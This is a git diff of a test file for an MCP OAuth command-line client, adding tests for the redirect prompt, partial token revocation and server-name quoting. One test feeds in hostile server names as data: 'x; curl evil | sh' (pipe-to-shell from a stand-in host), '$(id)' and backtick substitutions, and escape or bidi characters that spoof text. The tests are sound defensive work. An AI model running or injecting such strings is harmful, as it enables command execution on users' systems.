@@ -5,6 +5,7 @@
  */
 
 import { request as httpRequest } from 'node:http';
+import { PassThrough } from 'node:stream';
 import { createHash } from 'node:crypto';
 import {
   mkdirSync,
@@ -21,6 +22,7 @@ import { join } from 'node:path';
 import { afterEach, describe, expect, it } from 'vitest';
 
 import { browserCommand, openInBrowser } from '../browser-opener.js';
+import { HiddenPromptTooLongError, promptHiddenLine } from '../hidden-prompt.js';
 import { securityIdentity } from '@robota-sdk/agent-mcp';
 
 import { createMcpClientComposition } from '../mcp-client-composition.js';
@@ -61,14 +63,20 @@ function json(body: unknown, status = 200): Response {
 }
 
 /** Just enough authorization server for one sign-in; the "browser" approves and follows. */
-function fakeAuthorizationServer() {
+function fakeAuthorizationServer(revocation: 'down' | 'refresh-only' = 'down') {
   const codes = new Map<string, string>();
   const revocations: URLSearchParams[] = [];
   const fetch = (async (input: string | URL, init?: RequestInit) => {
     const url = new URL(String(input));
     const body = init?.body === undefined || init.body === null ? '' : String(init.body);
     if (url.href === 'https://auth.example.test/revoke') {
-      revocations.push(new URLSearchParams(body));
+      const form = new URLSearchParams(body);
+      revocations.push(form);
+      if (revocation === 'refresh-only') {
+        return form.get('token_type_hint') === 'refresh_token'
+          ? new Response(null, { status: 200 })
+          : json({ error: 'unsupported_token_type', error_description: 'leaked-text' }, 400);
+      }
       return json({ error: 'temporarily_unavailable', error_description: 'leaked-text' }, 503);
     }
     if (url.href === 'https://mcp.example.test/.well-known/oauth-protected-resource/mcp') {
@@ -291,6 +299,32 @@ describe('robota mcp login --no-browser', () => {
   });
 });
 
+describe('the pasted-redirect prompt', () => {
+  it('reports an over-long paste as too long, not as cancelled', async () => {
+    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
+    const result = await login(['files', '--no-browser'], userHome, {
+      promptRedirect: async () => {
+        throw new HiddenPromptTooLongError();
+      },
+    });
+    expect(result.code).toBe(1);
+    expect(result.err).toBe('Sign-in to MCP server "files" failed (redirect-too-long).\n');
+  });
+
+  it('stops reading when its signal aborts, and refuses a line over its limit', async () => {
+    const streams = () => ({ input: new PassThrough(), output: new PassThrough() });
+    const controller = new AbortController();
+    const waiting = promptHiddenLine('Redirect URL: ', streams(), { signal: controller.signal });
+    controller.abort();
+    await expect(waiting).rejects.toThrow('Cancelled.');
+
+    const long = streams();
+    const tooLong = promptHiddenLine('Redirect URL: ', long, { maxLength: 8 });
+    long.input.write('https://example.test/\n');
+    await expect(tooLong).rejects.toBeInstanceOf(HiddenPromptTooLongError);
+  });
+});
+
 describe('robota mcp logout', () => {
   it('deletes the credential even when revocation fails, and says so by reason only', async () => {
     const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
@@ -312,6 +346,16 @@ describe('robota mcp logout', () => {
 
     const again = await logout(['files'], userHome);
     expect(again.out).toContain('Not signed in to MCP server "files"');
+  });
+
+  it('says which token was revoked when the server revokes only one', async () => {
+    const userHome = home({ files: { type: 'http', url: MCP_URL, oauth: {} } });
+    expect((await login(['files'], userHome)).code).toBe(0);
+    const result = await logout(['files'], userHome, fakeAuthorizationServer('refresh-only'));
+    expect(result.out).toBe(
+      'Signed out of MCP server "files". The refresh token was revoked. The access token was not ' +
+        '(token-type-not-revocable) and stays valid until it expires.\n',
+    );
   });
 
   it('refuses a server that does not declare oauth, and a bad invocation', async () => {
@@ -363,7 +407,7 @@ describe('/mcp sign-in state and sign-out', () => {
     expect(signedIn).toEqual([{ serverId: 'files', state: 'signed-in' }]);
     expect(JSON.stringify(signedIn)).not.toMatch(/token-value/);
 
-    await expect(port.oauthLogout?.('files')).resolves.toEqual({
+    await expect(port.oauthLogout?.('files')).resolves.toMatchObject({
       serverId: 'files',
       removed: true,
       revocation: 'failed',
@@ -386,6 +430,20 @@ describe('MCP OAuth notices and browser', () => {
     expect(
       formatMcpOAuthNotice({ kind: 'insufficient-scope', serverId: 'files', scope: 'files:write' }),
     ).toContain('"files:write"');
+  });
+
+  it('quotes a hostile server name in the sign-in command, or leaves it out', () => {
+    const notice = (serverId: string): string =>
+      formatMcpOAuthNotice({ kind: 'login-required', serverId });
+    expect(notice('x; curl evil | sh')).toContain("run robota mcp login 'x; curl evil | sh'");
+    expect(notice('x$(id)')).toContain("run robota mcp login 'x$(id)'");
+    expect(notice('x`id`')).toContain("run robota mcp login 'x`id`'");
+    for (const name of ['x\nrun robota mcp login good', 'x\u001b[2Kgood', 'x\u202egood']) {
+      expect(notice(name)).toContain('run robota mcp login <server>');
+      for (const hidden of ['\n', '\u001b', '\u202e', 'good']) {
+        expect(notice(name)).not.toContain(hidden);
+      }
+    }
   });
 
   it('opens only https URLs, by argv, with each platform opener', async () => {
